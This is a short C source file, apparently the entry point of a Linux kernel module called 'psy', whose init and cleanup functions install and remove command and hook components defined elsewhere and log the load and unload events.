#include "inc/cmds.h"
#include "inc/hooks.h"
#include "inc/util.h"

MODULE_LICENSE("GPL");

int init(void);
void cleanup(void);

module_init(init);
module_exit(cleanup);

int init()
{
  if (!cInstall())
    {
      cleanup();
      return -1;
    }

  if (!hInstall())
    {
      cleanup();
      return -1;
    }

  printk(KERN_INFO "psy: module loaded\n");
  return 0;
}

void cleanup()
{
  hUninstall();
  cUninstall();
  printk(KERN_INFO "psy: module unloaded\n");
}
